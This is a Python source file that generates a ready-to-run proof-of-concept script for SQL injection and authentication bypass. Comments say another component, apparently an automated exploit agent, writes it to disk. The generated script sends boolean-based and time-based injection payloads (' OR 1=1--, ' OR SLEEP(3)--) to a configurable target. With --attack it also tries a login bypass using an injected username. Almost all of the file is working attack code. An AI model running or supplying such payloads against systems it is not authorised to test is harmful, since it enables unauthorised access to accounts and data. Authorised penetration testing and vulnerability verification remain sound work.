import textwrap
from typing import Dict, Any

def tmpl_web_auth_bypass_or_sqli(vuln: Dict[str, Any]) -> str:
    """
    Returns a ready-to-write poc.py script string for web auth-bypass/SQLi verification.
    This stays *generator-only* (no I/O). exploit_agent.py writes it to disk.
    """
    # You can dynamically inject defaults from 'vuln' below if desired.
    return textwrap.dedent(r'''\
    #!/usr/bin/env python3
    """
    PoC type: Auth bypass / SQLi verification (safe-by-default)
    - Default runs in verification mode: probes for SQLi/auth weaknesses using response deltas.
    - Use --attack to attempt a controlled login bypass (still non-destructive; no data writes).
    """
    import argparse, json, os, sys, time
    import requests
    from urllib.parse import urljoin

    def load_config(path):
        with open(path, "r", encoding="utf-8") as f:
            try:
                import yaml
                return yaml.safe_load(f)
            except Exception:
                return json.load(f)

    def rate_sleep(cfg):
        time.sleep(float(cfg.get("rate_limit", {}).get("sleep_seconds_between_requests", 0.5)))

    def main():
        ap = argparse.ArgumentParser()
        ap.add_argument("--config", default="exploit_config.yaml")
        ap.add_argument("--verify-only", action="store_true", help="Force verify-only mode")
        ap.add_argument("--attack", action="store_true", help="Attempt minimal login bypass")
        args = ap.parse_args()

        cfg = load_config(args.config)
        base = cfg["target"]["base_url"].rstrip("/")
        verify_tls = bool(cfg["target"].get("verify_tls", True))
        timeout = float(cfg["target"].get("timeout", 8.0))
        headers = dict(cfg["target"].get("headers", {}))
        params = dict(cfg["target"].get("params", {}))
        method = (cfg["target"].get("method") or "GET").upper()
        vuln_path = cfg["target"].get("vuln_path", "/")
        url = urljoin(base + "/", vuln_path.lstrip("/"))

        # auth handling
        auth_type = cfg.get("auth", {}).get("type", "none")
        session = requests.Session()
        if auth_type == "bearer":
            token = cfg["auth"].get("token", "")
            if token: headers["Authorization"] = f"Bearer {token}"
        elif auth_type == "cookie":
            session.cookies.update(cfg["auth"].get("cookies", {}))
        elif auth_type == "basic":
            session.auth = (cfg["auth"].get("username",""), cfg["auth"].get("password",""))

        # Determine run mode (verify-only unless explicit --attack)
        verify_only = args.verify_only or cfg.get("modes",{}).get("verify_only", True)
        attack = args.attack or cfg.get("modes",{}).get("attack", False)
        if attack and verify_only:
            print("[!] Conflicting flags: --attack overrides verify-only")
            verify_only = False

        def send(payload_params):
            rate_sleep(cfg)
            if method == "GET":
                return session.get(url, headers=headers, params=payload_params, timeout=timeout, verify=verify_tls)
            else:
                return session.post(url, headers=headers, data=payload_params, timeout=timeout, verify=verify_tls)

        # === Verification: boolean/time-based SQLi signals ===
        # Baseline
        r0 = send(params)
        base_len = len(r0.text)
        base_code = r0.status_code

        # Boolean-based probe
        inj_true = params.copy()
        inj_false = params.copy()
        key = next(iter(params.keys()), "q")
        inj_true[key]  = f"{params.get(key,'')}'+OR+1=1--"
        inj_false[key] = f"{params.get(key,'')}'+AND+1=2--"

        r_true = send(inj_true)
        r_false = send(inj_false)

        delta_true  = abs(len(r_true.text)  - base_len)
        delta_false = abs(len(r_false.text) - base_len)

        print(f"[i] Baseline {base_code} len={base_len}")
        print(f"[i] True-probe {r_true.status_code} len={len(r_true.text)} Δ={delta_true}")
        print(f"[i] False-probe {r_false.status_code} len={len(r_false.text)} Δ={delta_false}")

        sqli_suspected = (delta_true > 50 and delta_false <= 10) or (r_true.status_code != r_false.status_code)
        if sqli_suspected:
            print("[+] Potential SQLi behavior detected (boolean delta).")
        else:
            inj_sleep = params.copy()
            inj_sleep[key] = f"{params.get(key,'')}'+OR+SLEEP(3)--"
            t0 = time.time()
            r_sleep = send(inj_sleep)
            dt = time.time() - t0
            print(f"[i] Sleep-probe elapsed: {dt:.2f}s status={r_sleep.status_code}")
            if dt > 2.5 and abs(len(r_sleep.text) - base_len) <= 10:
                sqli_suspected = True
                print("[+] Potential time-based SQLi indicated.")

        # Minimal auth-bypass check (only when requested)
        if attack:
            login_path = cfg["target"].get("login_path", "/login")
            login_url = urljoin(base + "/", login_path.lstrip("/"))
            creds = {"username": "' OR 1=1--", "password": "x"}
            print(f"[i] Attempting minimal login bypass at {login_url}")
            rate_sleep(cfg)
            rr = session.post(login_url, headers=headers, data=creds, timeout=timeout, verify=verify_tls)
            print(f"[i] Login bypass attempt status={rr.status_code} len={len(rr.text)}")
            if rr.status_code in (200, 302) and "logout" in rr.text.lower():
                print("[+] Possible login bypass.")
            else:
                print("[-] Login bypass not observed.")
        else:
            print("[i] Skipped attack step; verification-only mode.")

        # Write evidence
        ev = {
            "baseline_status": base_code,
            "baseline_len": base_len,
            "sqli_suspected": bool(sqli_suspected),
            "timestamp": time.time()
        }
        with open("evidence.json", "w", encoding="utf-8") as f:
            json.dump(ev, f, indent=2)
        print("[*] Evidence written to evidence.json")

    if __name__ == "__main__":
        main()
    ''' )

# Note: This is a simplified example. Real-world PoCs should handle more edge cases and be more robust.